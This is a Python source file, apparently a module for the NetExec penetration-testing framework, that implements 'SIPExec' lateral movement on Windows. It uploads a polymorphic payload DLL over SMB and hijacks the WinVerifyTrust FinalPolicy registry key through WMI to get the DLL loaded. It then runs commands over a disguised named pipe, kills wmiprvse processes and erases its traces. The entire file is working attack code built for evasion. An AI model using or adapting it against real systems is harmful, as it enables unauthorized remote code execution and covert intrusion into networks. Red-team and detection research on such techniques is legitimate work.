"""SIPExec — Lateral movement via WinVerifyTrust FinalPolicy hijack.

Hijacks the FinalPolicy trust provider registry key to load a payload DLL
when WMI triggers signature verification (Win32_PnPSignedDriver query).
Uploads polymorphic DLL to target, communicates via named pipe.

Zero threading — matches wmiexec/mmcexec pattern.
"""

import contextlib
import os
import random
import string
import time

from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dtypes import NULL

from nxc.paths import DATA_PATH

HKLM = 0x80000002
FP_KEY = "SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{00AAC56B-CD44-11D0-8CC2-00C04FC295EE}"
PAYLOAD_DLL = os.path.join(DATA_PATH, "sipexec", "sipexec_payload.dll")

try:
    from nxc.protocols.smb.sipexec_poly import mutate as _poly_mutate
    _HAS_POLY = True
except ImportError:
    _HAS_POLY = False


def _derive_pipe_name(dll_basename, fnv_seed=2166136261, fnv_prime=16777619, pipe_fmt=None):
    name = dll_basename.lower()
    h = fnv_seed
    for ch in name.encode("ascii", errors="ignore"):
        h ^= ch
        h = (h * fnv_prime) & 0xFFFFFFFF
    return (pipe_fmt.decode().rstrip("\x00") if pipe_fmt else "wkssvc_%08x") % h


class SIPEXEC:
    def __init__(self, target, share_name, username, password, domain, smbconnection,
                 doKerberos=False, aesKey=None, kdcHost=None, remoteHost=None,
                 hashes=None, share=None, logger=None, timeout=None, tries=None):
        self.__target = target
        self.__username = username
        self.__password = password or ""
        self.__domain = domain
        self.__lmhash = ""
        self.__nthash = ""
        self.__timeout = timeout or 5
        self.__smbconnection = smbconnection
        self.__aesKey = aesKey
        self.__kdcHost = kdcHost
        self.__remoteHost = remoteHost
        self.__doKerberos = doKerberos
        self.logger = logger

        if hashes:
            self.__lmhash, self.__nthash = [*hashes.split(":", 1), ""][:2]

        self.__dllName = "".join(random.choices(string.ascii_lowercase, k=8)) + ".dll"
        self.__pipeName = _derive_pipe_name(self.__dllName)
        self.__remoteDllPath = None
        self.__doneTag = "DONE"
        self.__outputBuffer = ""

        # Single DCOM, single CoCreateInstanceEx — both namespaces via same login
        target_host = self.__remoteHost or self.__target
        self.__dcom = DCOMConnection(
            target_host, self.__username, self.__password, self.__domain,
            self.__lmhash, self.__nthash, self.__aesKey,
            doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        iI = self.__dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
        iL = wmi.IWbemLevel1Login(iI)
        self.__wmiDefault = iL.NTLMLogin("//./root/default", NULL, NULL)
        self.__wmiCimv2 = iL.NTLMLogin("//./root/cimv2", NULL, NULL)
        iL.RemRelease()

    def _dbg(self, msg):
        if self.logger:
            self.logger.debug(msg)

    def execute(self, command, output=False):
        self.__outputBuffer = ""
        try:
            self.__upload()
            self.__hijack()
            self.__trigger()
            if not self.__pipeExec(command, output, timeout=5):
                self._dbg("Warm target — kill + retry")
                self.__killWmiprvse()
                self.__trigger()
                self.__pipeExec(command, output)
        except Exception as e:
            self._dbg(f"SIPEXEC error: {e}")
        finally:
            self.__cleanup()
        return self.__outputBuffer

    def __upload(self):
        """Upload polymorphic DLL to target."""
        if _HAS_POLY:
            dll_data, done_marker, fnv_seed, fnv_prime = _poly_mutate(PAYLOAD_DLL)
            idx = dll_data.find(b"POLY_PIPE_FMT__")
            pipe_fmt = dll_data[idx + 15:idx + 64].split(b"\x00")[0] if idx >= 0 else None
            self.__doneTag = done_marker.strip(b"\n").strip(b"[]").decode("ascii", errors="replace")
            self.__pipeName = _derive_pipe_name(self.__dllName, fnv_seed, fnv_prime, pipe_fmt)
            self._dbg(f"Poly DLL: pipe={self.__pipeName} tag={self.__doneTag}")
        else:
            with open(PAYLOAD_DLL, "rb") as f:
                dll_data = f.read()
        sent = [False]
        self.__smbconnection.putFile("ADMIN$", f"Temp\\{self.__dllName}",
                                     lambda _: b"" if sent[0] else (sent.__setitem__(0, True) or dll_data))
        self.__remoteDllPath = f"C:\\Windows\\Temp\\{self.__dllName}"
        self._dbg(f"Uploaded {self.__remoteDllPath}")

    def __hijack(self):
        """Hijack FinalPolicy $DLL via WMI StdRegProv (root/default, same DCOM)."""
        try:
            stdreg, _ = self.__wmiDefault.GetObject("StdRegProv")
            stdreg.SetStringValue(HKLM, FP_KEY, "$DLL", self.__remoteDllPath)
            self._dbg(f"FinalPolicy → {self.__remoteDllPath}")
        except Exception as e:
            self._dbg(f"Hijack error: {e}")

    def __trigger(self):
        """Fire WVT trigger synchronously. Non-blocking DLL returns S_OK instantly."""
        try:
            svc = self.__getCimv2()
            svc.ExecQuery("SELECT IsSigned FROM Win32_PnPSignedDriver WHERE DeviceName='null'")
            self._dbg("WVT triggered")
        except Exception as e:
            self._dbg(f"Trigger error: {e}")

    def __getCimv2(self):
        """Get cimv2 service — create fresh DCOM if current one is stale (after kill)."""
        if self.__wmiCimv2:
            return self.__wmiCimv2
        # Stale after kill — create fresh
        target_host = self.__remoteHost or self.__target
        dcom = DCOMConnection(
            target_host, self.__username, self.__password, self.__domain,
            self.__lmhash, self.__nthash, self.__aesKey,
            doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        self.__dcom = dcom  # Replace for cleanup
        iI = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
        iL = wmi.IWbemLevel1Login(iI)
        self.__wmiCimv2 = iL.NTLMLogin("//./root/cimv2", NULL, NULL)
        iL.RemRelease()
        return self.__wmiCimv2

    def __pipeExec(self, command, capture_output, timeout=15):
        """Connect pipe, send command, optionally capture output."""
        conn = self.__smbconnection
        conn.setTimeout(60)
        tid = conn.connectTree("IPC$")
        deadline = time.time() + timeout
        fid = None
        while time.time() < deadline:
            try:
                fid = conn.openFile(tid, self.__pipeName)
                time.sleep(0.05)
                conn.readNamedPipe(tid, fid, 4096)  # greeting
                break
            except Exception:
                time.sleep(0.1)
        if fid is None:
            self._dbg(f"Pipe {self.__pipeName} not found (timeout={timeout}s)")
            with contextlib.suppress(Exception):
                conn.disconnectTree(tid)
            return False

        self._dbg(f"Pipe connected: {self.__pipeName}")
        self.__restore()
        tag = self.__doneTag.encode("ascii")

        try:
            conn.writeNamedPipe(tid, fid, command.encode("utf-8"))
            self._dbg(f"Sent command: {command}")
            buf = b""
            while True:
                chunk = conn.readNamedPipe(tid, fid, 65536)
                buf += chunk
                if tag in buf:
                    break
        except Exception:
            pass

        if capture_output:
            text = buf.decode("utf-8", errors="replace")
            if self.__doneTag in text:
                text = text[:text.index(self.__doneTag)].rstrip("\n[")
            self.__outputBuffer = text.rstrip("\r\n")

        with contextlib.suppress(Exception):
            conn.writeNamedPipe(tid, fid, b"exit")
        with contextlib.suppress(Exception):
            conn.closeFile(tid, fid)
        return True

    def __killWmiprvse(self):
        """Kill wmiprvse — invalidates current cimv2 DCOM."""
        self._dbg("Killing wmiprvse...")
        try:
            svc = self.__wmiCimv2
            if not svc:
                return
            result = svc.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name='wmiprvse.exe'")
            try:
                while True:
                    pid = result.Next(0xFFFFFFFF, 1)[0].ProcessId
                    try:
                        proc, _ = svc.GetObject(f'Win32_Process.Handle="{pid}"')
                        proc.Terminate(1)
                    except Exception:
                        pass
            except Exception:
                pass
        except Exception:
            pass
        # Mark cimv2 as stale — __getCimv2 will create fresh
        self.__wmiCimv2 = None
        time.sleep(0.2)

    def __restore(self):
        """Restore FinalPolicy $DLL to WINTRUST.DLL."""
        try:
            stdreg, _ = self.__wmiDefault.GetObject("StdRegProv")
            stdreg.SetStringValue(HKLM, FP_KEY, "$DLL", "WINTRUST.DLL")
            self._dbg("Registry restored")
        except Exception as e:
            self._dbg(f"Restore failed: {e}")

    def __cleanup(self):
        self.__restore()

        # Kill wmiprvse to clear FinalPolicy cache for next run
        try:
            svc = self.__getCimv2()
            result = svc.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name='wmiprvse.exe'")
            try:
                while True:
                    pid = result.Next(0xFFFFFFFF, 1)[0].ProcessId
                    try:
                        proc, _ = svc.GetObject(f'Win32_Process.Handle="{pid}"')
                        proc.Terminate(1)
                    except Exception:
                        pass
            except Exception:
                pass
        except Exception:
            pass

        # Brief wait for wmiprvse to exit and release DLL file lock
        time.sleep(0.3)

        # Delete DLL (after kill — wmiprvse released the file)
        if self.__remoteDllPath and "Windows\\Temp" in self.__remoteDllPath:
            with contextlib.suppress(Exception):
                self.__smbconnection.deleteFile("ADMIN$", f"Temp\\{self.__dllName}")

        # Disconnect DCOM
        with contextlib.suppress(Exception):
            self.__dcom.disconnect()
